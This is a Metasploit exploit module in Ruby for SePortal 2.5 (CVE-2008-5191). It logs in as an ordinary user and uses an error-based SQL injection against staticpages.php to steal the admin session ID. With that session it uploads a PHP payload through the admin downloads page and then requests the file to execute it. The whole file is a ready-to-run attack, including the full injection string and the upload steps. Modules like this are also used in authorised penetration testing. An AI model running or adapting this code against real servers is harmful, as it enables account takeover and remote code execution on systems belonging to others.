##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SePortal SQLi Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in SePortal version 
2.5.
        When logging in as any non-admin user, it's possible to retrieve 
the admin session
        from the database through SQL injection. The SQL injection 
vulnerability exists
        in the "staticpages.php" page. This hash can be used to take 
over the admin
        user session. After logging in, the "/admin/downloads.php" page 
will be used
        to upload arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'jsass', # Discovery
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2008-5191'],
          ['OSVDB', '46567'],
          ['EDB', '32359']
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['SePortal', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 20 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to the 
SePortal installation', '/seportal']),
          OptString.new('USER', [true, 'The non-admin user', 'test']),
          OptString.new('PASS', [true, 'The non-admin password', 
'test'])
        ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    vprint_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "index.php")
    })

    if res and res.code == 200 and res.body =~ /Powered by 
\<b\>SePortal\<\/b\> (.*)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    vprint_status("#{peer} - Version #{version} detected")

    if version.to_f <= 2.5
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    print_status("#{peer} - Logging in as user [ #{datastore['USER']} 
]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "login.php"),
      'vars_post' => {
          "user_name" => datastore['USER'],
          "user_password" => datastore['PASS']
      }
    })

    if res && res.code == 302 and res.get_cookies =~ 
/sessionid=([a-zA-Z0-9]+)/
      session = $1
      print_status("#{peer} - Login successful")
      print_status("#{peer} - Session cookie is [ #{session} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Login was not succesful!")
    end

    # Generate random string and convert to hex
    sqlq = rand_text_alpha(8)
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join

    # Our SQL Error-Based Injection string - The string will return the 
admin session between the words ABCD<hash>ABCD in the response page.
    sqli = "1' AND (SELECT #{sqls} FROM(SELECT 
COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST(session_id AS 
CHAR),0x20)),1,50) "
    sqli << "FROM seportal_sessions WHERE session_user_id=1 LIMIT 1"
    sqli << "),0x#{sqls},FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 
'0x#{sqls}'='0x#{sqls}"

    print_status("#{peer} - Retrieving admin session through SQLi")
    res = send_request_cgi({
      'method' => 'POST',
      'vars_get'   => { "sp_id" => sqli },
      'cookie' => "sessionid=#{session}",
      'uri'    => normalize_uri(uri, "staticpages.php")
    })

    if res and res.code == 200 and res.body =~ 
/#{sqlq}([a-zA-Z0-9]+)#{sqlq}/
      adminhash = $1
      print_status("#{peer} - Admin session is [ #{adminhash} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Retrieving admin session 
failed!")
    end

    # Random filename
    payload_name = rand_text_alpha_lower(rand(10) + 5) + '.php'
    # Random title
    rand_title = rand_text_alpha_lower(rand(10) + 5)
    # Random category ID
    rand_catid = rand_text_numeric(4)

    post_data = Rex::MIME::Message.new
    post_data.add_part("savefile", nil, nil, "form-data; 
name=\"action\"")
    post_data.add_part(payload.encoded, "application/octet-stream", nil, 
"form-data; name=\"file\"; filename=\"#{payload_name}\"")
    post_data.add_part(rand_title, nil, nil, "form-data; 
name=\"file_title\"")
    post_data.add_part(rand_catid, nil, nil, "form-data; 
name=\"cat_id\"")

    file = post_data.to_s
    file.strip!

    print_status("#{peer} - Uploading payload [ #{payload_name} ]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "admin", "downloads.php"),
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => "sessionid=#{adminhash}",
      'data'   => file
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200
      fail_with(Failure::Unknown, "#{peer} - File wasn't uploaded, 
aborting!")
    end

    register_file_for_cleanup(payload_name)

    print_status("#{peer} - Requesting payload [ 
#{uri}/data/down_media/#{payload_name} ]")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "data", "down_media", 
"#{payload_name}")
    })

    # If we don't get a 200 when we request our malicious payload, we 
suspect
    # we don't have a shell, either.
    if res and res.code != 200
      print_error("#{peer} - Unexpected response, exploit probably 
failed!")
    end

  end

end
